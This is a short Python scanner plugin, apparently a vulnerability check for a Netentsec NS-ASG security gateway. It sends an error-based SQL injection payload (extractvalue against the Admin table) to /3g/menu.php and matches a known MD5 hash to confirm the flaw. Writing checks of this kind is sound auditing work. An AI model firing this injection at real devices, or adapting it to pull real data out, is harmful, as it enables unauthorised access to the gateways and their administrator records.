#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  网康 NS-ASG 应用安全网关3g SQL Injection
Reference :  http://www.wooyun.org/bugs/wooyun-2013-043523
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "ip":
        return True, arg
        
def audit(arg):
    
    payload = "/3g/menu.php?uid=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(md5(123456))%20from%20Admin%20limit%201)))"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    m = re.search("e10adc3949ba59abbe56e057f20f883",res)
    if m:
        security_hole('网康 NS-ASG 应用安全网关3g SQL Injection exists.')

if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', 'http://www.example.com/')[1])
